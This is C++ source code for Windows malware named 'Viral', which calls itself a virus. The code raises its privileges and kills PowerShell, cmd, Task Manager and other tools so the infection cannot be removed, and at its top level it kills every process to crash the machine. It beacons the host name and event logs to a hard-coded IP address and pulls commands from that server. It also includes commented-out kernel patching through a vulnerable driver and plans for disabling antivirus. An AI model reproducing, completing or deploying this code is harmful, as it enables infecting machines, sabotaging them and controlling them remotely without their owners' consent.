#include "global.h"

DWORD internalLastError;
ProcessManager* pProcessManager;
ThreadManager* pThreadManager;
std::vector<std::string> eventLog;
std::vector<std::string> commandList;

// INFO: std::vector is not multi-thread-safe. Vector can only be manipulated by one thread at a time so we use this flag to declare who is using it.
std::mutex threadLock;

DWORD Viral::killSignal = 0x0;
BOOL Viral::killSignalReceived = FALSE;
DWORD Viral::viralStatus = level5;


int main()
{
	if (Viral::initGlobals() != SUCCESS) {
		return internalLastError;
	}

	if (Viral::initUsermode() != SUCCESS) {
		return internalLastError;
	}

	/*if (Viral::patchKernel() != SUCCESS) {
		return FAIL;
	}
	
	if (Viral::root() != SUCCESS) {
		return FAIL;
	}*/

	//if (Viral::sendKillSignal(KILL_NoAV) != SUCCESS) {
	//	return internalLastError;
	//}

	//Screen::Shot();

	while (pThreadManager->viralThreads.size() != 0) {
		Sleep(0200);
	}

	system("PAUSE");
}

DWORD Viral::initGlobals()
{
	internalLastError = NULL;

	pProcessManager = new ProcessManager();
	if (pProcessManager) {
		pThreadManager = new ThreadManager();
		if (pThreadManager) {
			return SUCCESS;
		}
		else {
			return (internalLastError = LOAD_FAILURE_THREAD_MANAGER);
		}
	}
	else {
		return (internalLastError = LOAD_FAILURE_PROCESS_MANAGER);
	}
}

DWORD Viral::patchKernel()
{
	const char* ldrDirectory = "ldr.exe";
	const char* ldrFull = "ldr.exe gdrv.sys DismantleOS.sys";
	pProcessManager->startSubProcess((char*)ldrDirectory, (char*)ldrFull);

	//TODO: Check for failure to patch kernel

	return SUCCESS;
}

DWORD Viral::root()
{
	const char* ldrDirectory = "ldr.exe";
	const char* ldrFull = "ldr.exe gdrv.sys root.sys";
	pProcessManager->startSubProcess((char*)ldrDirectory, (char*)ldrFull);

	//TODO: Check for failure to root system

	return SUCCESS;
}

DWORD Viral::initUsermode()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
	CloseHandle(hToken);

	std::thread* viralNoAV = new std::thread(Viral::NoAV);
	DWORD errCode = pThreadManager->createThread((char*)"viralNoAV", viralNoAV);
	if (errCode == SUCCESS) {
		std::thread* viralWatchdog = new std::thread(Viral::Watchdog);
		errCode = pThreadManager->createThread((char*)"viralWatchdog", viralWatchdog);
		if (errCode == SUCCESS) {
			std::thread* viralPhoneHome = new std::thread(Viral::PhoneHome);
			errCode = pThreadManager->createThread((char*)"viralPhoneHome", viralPhoneHome);
			if (errCode == SUCCESS) {
				std::thread* viralExecuteTasks = new std::thread(Viral::ExecuteTasks);
				errCode = pThreadManager->createThread((char*)"viralExecuteTasks", viralExecuteTasks);
				if (errCode == SUCCESS) {
					return SUCCESS;
				}
			}
		}
		else
			return internalLastError;
	}
	else
		return internalLastError;
}

VOID Viral::NoAV()
{
	while (Viral::killSignal != KILL_NoAV) {
		//TODO: Terminate the majors by market share: ESET (12.89%), McAfee (11.9%), Symantec (10.27%), Bitdefender (10.17%), AVAST (10.09%) -- Allows
		//		infection of ~50% of the population. Yet, for now, we are not in any AV database so let's just sleep this infinite loop.

		Sleep(1000);
	}
	Viral::killSignalReceived = TRUE;
}

VOID Viral::Watchdog()
{
	while (Viral::killSignal != KILL_Watchdog) {

	#pragma region WATCHDOG_ProcessScan

		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(PROCESSENTRY32);
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (Process32First(snapshot, &entry) == TRUE)
		{
			while (Process32Next(snapshot, &entry) == TRUE)
			{
				switch (Viral::viralStatus) {
				case level5: {
					// INFO: Viral is at DEFCON 5; we should remain invisible to the host and not utilize Watchdog at all.
				} break;
				case level4: {
					// INFO: Viral is at DEFCON 4; Watchdog will terminate powerful processes that can hurt Viral like Powershell, and CMD. It is likely
					//		 that the host will not notice this and if they do it is advised Viral be upgraded to DEFCON 3.

					if ((strcmp(entry.szExeFile, "powershell.exe") == 0) || (strcmp(entry.szExeFile, "cmd.exe") == 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + strtok(std::ctime(&ToD), "\n")));
						}
						CloseHandle(hProcess);
					}
				} break;
				case level3: {
					// INFO: Viral is at DEFCON 3; Watchdog will terminate powerful processes that can hurt Viral like Powershell, CMD, Settings, Task
					//		 Manager. It is likely that the host wlil notice this behaviour. Viral should only be upgraded to DEFCON 3 as a temporary measure 
					//		 when a host is attacking Viral. Viral should downgrade to DEFCON 4 as soon as the attack is over.

					if ((strcmp(entry.szExeFile, "powershell.exe") == 0) || (strcmp(entry.szExeFile, "cmd.exe") == 0) || (strcmp(entry.szExeFile, "SystemSettings.exe") == 0) || (strcmp(entry.szExeFile, "Taskmgr.exe") == 0) || (strcmp(entry.szExeFile, "ProcessHacker.exe") == 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + strtok(std::ctime(&ToD), "\n")));
						}
						CloseHandle(hProcess);
					}
				} break;
				case level2: {
					// INFO: Viral is at DEFCON 2; Watchdog will terminate most processes that can hurt Viral like Powershell, CMD, Settings, Task Manager,
					//		 Popular Browsers, Popular Debugging Utliities. The host wlil notice this behaviour. Viral should only be upgraded to DEFCON 4 as a
					//		 temporary measure assuming DEFCON 3 was not suitable. The longer Viral is at DEFCON 2, the more likely it becomes that the user will
					//		 attempt to reinstall their entire OS removing Viral completley.

					//TODO: Implement Watchdog DEFCON 2
				} break;
				case level1: {
					// INFO: Viral is at DEFCON 1; Watchdog will terminate ALL processes (even system-critical). This will force an instantaneous BugCheck. The host 
					//		 WILL notice this behaviour.

					if ((strcmp(entry.szExeFile, "viral.exe") != 0))
					{
						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
						if (TerminateProcess(hProcess, 1)) {
							auto reportProcessToD = std::chrono::system_clock::now();
							std::time_t ToD = std::chrono::system_clock::to_time_t(reportProcessToD);
							Viral::reportEvent(WATCHDOG_REPORT, std::string("Terminated " + std::string(entry.szExeFile) + " at " + strtok(std::ctime(&ToD), "\n")));
						}
						CloseHandle(hProcess);
					}
				} break;
				}
			}
		}
		CloseHandle(snapshot);

	#pragma endregion


	}
	Viral::killSignalReceived = TRUE;
}

// INFO: Viral is a virus afterall, and curl retardedly outputs to stdout unless redirected, so to save our output from being captured, we re-direct it to this 
//		 dummy output function
size_t WriteCallback(char* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

VOID Viral::PhoneHome()
{
	CURL* curl;

	curl = curl_easy_init();

	while (Viral::killSignal != KILL_PhoneHome) {
		if (curl != NULL) {
			// INFO: If Viral has events in its eventLog (loaded in by a call to reportEvent) then we pop the front event off the std::vector and send it to our
			//		server to be processed and placed in the database. This is esentially Viral's "Phone Home" method where it replies or talks to the server.
				while (eventLog.size() > 0) {
					curl_easy_setopt(curl, CURLOPT_URL, "http://157.245.187.140:8000");

					// INFO: Viral will now deal with reporting the OLDEST event
					std::vector<std::string>::iterator it = eventLog.begin();

					const DWORD compNameSize = 64;
					char compNameBuff[compNameSize];
					if (!GetComputerNameA(compNameBuff, (DWORD*)&compNameSize)) {
						// TODO: If GetComputerNameA fails, we don't know whos sending the notification
						strcpy(compNameBuff, "HOSTNAME-FAILED");
					}

					std::string postRequest = "{\"type\": \"notification\", \"hostname\": \"" + std::string(compNameBuff) + "\", \"notification\": \"" + *it + "\"}";
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postRequest.c_str());
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback);

					if (curl_easy_perform(curl) == 0) {
						// INFO: Viral's server responded with HTTP 200 (OK), it SHOULD (likely not with my programming) have stored the notification in its database, 
						//		 popping it off the vector
						std::lock_guard<std::mutex> guard(threadLock);
						eventLog.erase(it);
					}
					else {
						// INFO: Viral's server did not respond or did not accept the request, no notification was stored in the database
						// TODO: Find a better way to do this, this is actually retarded, just going to keep attempting to send it until it sends
					}
				}

				// INFO: This is just used as a separator for clean code to indicate a different operation in Viral::PhoneHome
				if (TRUE) {
					curl_easy_setopt(curl, CURLOPT_URL, "http://157.245.187.140:8000");

					const DWORD compNameSize = 64;
					char compNameBuff[compNameSize];
					if (!GetComputerNameA(compNameBuff, (DWORD*)&compNameSize)) {
						// INFO: If GetComputerNameA fails, we might as well quit, as it is used for the query to receive commands for us in on the server. We also
						//		 treat this as a reportable event because Viral cannot receive commands.
						// TODO: Report this event
						break;
					}

					std::string postRequest = "{\"type\": \"commands\", \"hostname\": \"" + std::string(compNameBuff) + "\"}";
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postRequest.c_str());

					std::string readBuffer;
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback);
					curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

					if (curl_easy_perform(curl) == 0) {
						// INFO: Viral's server responded with HTTP 200 (OK), it SHOULD (likely not with my programming) have retrieved the commands from the database
						if (readBuffer.find(",") != std::string::npos) {
							unsigned first = readBuffer.find("{");
							unsigned last = readBuffer.find(",}");
							std::string multi_command_string = readBuffer.substr(first + 1, last - (first + 1));
							
							std::lock_guard<std::mutex> guard(threadLock);
							while (multi_command_string.find(",") != std::string::npos) {
								unsigned commaPosition = multi_command_string.find(",");
								commandList.push_back(std::string(multi_command_string.substr(0, commaPosition)));
								multi_command_string = multi_command_string.substr(commaPosition + 1, multi_command_string.size() - 1);
							}
							commandList.push_back(multi_command_string);
						}
					}
					else {
						// INFO: Viral's server did not respond or did not accept the request, no commands were brought in. This is a reportable event
						// TODO: Report this event
					}
				}

		}
	}

	curl_easy_cleanup(curl);

	Viral::killSignalReceived = TRUE;
}

VOID Viral::ExecuteTasks()
{
	while (Viral::killSignal != KILL_ExecuteTasks) {
		// INFO: If Viral has commands from the server to do a task on the host machine, execute them.
		std::lock_guard<std::mutex> guard(threadLock);
		while (commandList.size() > 0) {
			std::vector<std::string>::iterator it = commandList.begin();
			std::string fullCmd = *it;

			// INFO: Viral commands are delimited by spaces, from position 0 to the first instance of the " " character is the command to execute, after is the args.
			unsigned breakPosition = fullCmd.find(" ");

			std::string command;
			std::string arguments;

			if (breakPosition == std::string::npos) {
				command = fullCmd;
			}
			else {
				command = fullCmd.substr(0, breakPosition);
				arguments = fullCmd.substr(breakPosition + 1, fullCmd.size());
			}

			/*
			INFO:
				CMD:	setstatus
				ARGS:	int (DEFCON level)
				DESC:	Upgrades or downgrades Viral's DEFCON level
			*/
			if (command == std::string("setstatus")) {
				Viral::changeStatus(std::stoi(arguments));
				commandList.erase(it);
			}

			/*
			INFO:
				CMD:	killviral
				ARGS:	[NULL]
				DESC:	Stops viral permanently, consider setting Viral to DEFCON 5 to hide Viral but not stop it permanently
			*/
			if (command == std::string("killviral")) {
				Viral::stop();
				commandList.erase(it);
			}
		}
	}
	Viral::killSignalReceived = TRUE;
}

DWORD Viral::sendKillSignal(DWORD signal)
{
	std::string threadName;
	switch (signal) {
	case KILL_NoAV:
		threadName = "viralNoAV";
		break;
	case KILL_Watchdog:
		threadName = "viralWatchdog";
		break;
	case KILL_PhoneHome:
		threadName = "viralPhoneHome";
		break;
	case KILL_ExecuteTasks:
		threadName = "viralExecuteTasks";
		break;
	default:
		threadName = "null";
		break;
	}

	Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Requested termination of Viral Thread: " + threadName));

	Viral::killSignal = signal;

	// TODO: This suspends Viral's init thread for 1 millisecond to wait for the killSignal to be received. This is VERY SITUATIONAL, it's likely it 
	//		 will be received within 1 millisecond but not in ALL cases. Also, the suspension of Viral's main thread could be crucial later in its
	//		 evolution. It's better in the future to use the ThreadManager to create a new thread with the sole purpose of sending a kill signal to
	//		 avoid suspending Viral's init thread.

	Sleep(0001);

	if (Viral::killSignalReceived == TRUE) {
		Viral::killSignalReceived = FALSE;
		if (pThreadManager->killThread((char*)threadName.c_str()) != SUCCESS) {
			return internalLastError;
		}
		else {
			Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Terminated Viral Thread: " + threadName));
			return SUCCESS;
		}
	}
	else {
		return (internalLastError = SIGNAL_NOT_RECEIVED);
	}
}

VOID Viral::reportEvent(DWORD eventType, std::string event)
{
	std::string reportLead = "[Unknown]";

	switch (eventType) {
	case WATCHDOG_REPORT:
		reportLead = "[Viral::Watchdog]";
		break;
	case VIRAL_CORE_EVENT:
		reportLead = "[Viral::Core]";
		break;
	case VIRAL_FAILED_NOTIF:
		reportLead = "[FAILED NOTIFICATION]";
		break;
	default:
		reportLead = "[Unknown]";
		break;
	}
	eventLog.push_back(std::string(reportLead + ": " + event));
}

VOID Viral::changeStatus(DWORD newStatus)
{
	if (Viral::viralStatus == newStatus) {
		Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Viral Status change request received, but Viral is already at DEFCON ") + std::string(std::to_string(Viral::viralStatus)));
	}
	else {
		// INFO: In the rare case where Viral is upgraded to DEFCON 1, Viral will allow 5 seconds for the report log to send to the server as DEFCON 1 will destroy
		//		 any usability of the system until the OS is re-installed, not allowing Viral's messages to get out.
		if (newStatus == level1)
			Sleep(5000);

		Viral::viralStatus = newStatus;

		Viral::reportEvent(VIRAL_CORE_EVENT, std::string("Viral Status changed to DEFCON ") + std::to_string(Viral::viralStatus));
	}
}

VOID Viral::stop()
{
	// INFO: Viral must be stopped in this order
	if (sendKillSignal(KILL_NoAV) == SUCCESS) {
		if (sendKillSignal(KILL_Watchdog) == SUCCESS) {
			if (sendKillSignal(KILL_ExecuteTasks) == SUCCESS) {
				if (sendKillSignal(KILL_PhoneHome) == SUCCESS) {
					return;
				}
			}
		}
	}

	// INFO: Not every kill signal got out and/or didn't work properly. Viral::stop MUST succeed, it is the final kill-switch.
	std::exit(0);

	// INFO: IF all else fails
	std::abort();
}

